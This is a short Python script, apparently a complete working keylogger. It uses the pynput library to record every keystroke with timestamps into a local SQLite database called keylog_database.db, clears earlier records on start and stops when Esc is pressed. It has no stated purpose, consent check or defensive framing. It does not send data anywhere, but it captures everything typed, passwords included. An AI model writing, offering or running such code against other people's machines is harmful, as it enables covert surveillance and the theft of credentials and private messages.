import sqlite3
import os
from pynput import keyboard
from datetime import datetime

db_file = "keylog_database.db"

def clear_db():
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM keystrokes;")
    conn.commit()
    conn.close()



def init_db():
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY,
            timestamp TEXT,
            key TEXT
        )
    """)
    conn.commit()
    conn.close()
    clear_db()

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log_to_db(timestamp, key):
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO keystrokes (timestamp, key) VALUES (?, ?)", (timestamp, key))
    conn.commit()
    conn.close()

buffer = ""

def on_press(key):
    global buffer
    try:
        if key.char:
            buffer += key.char
    except AttributeError:
        timestamp = get_timestamp()
        if buffer:
            log_to_db(timestamp, buffer)
            buffer = ""
        log_to_db(timestamp,"Special Key - "+str(key))

def on_release(key):
    global buffer
    if key == keyboard.Key.space:
        timestamp = get_timestamp()
        if buffer:
            log_to_db(timestamp, buffer)
            buffer = ""
    if key == keyboard.Key.esc:
        return False

init_db()

with keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()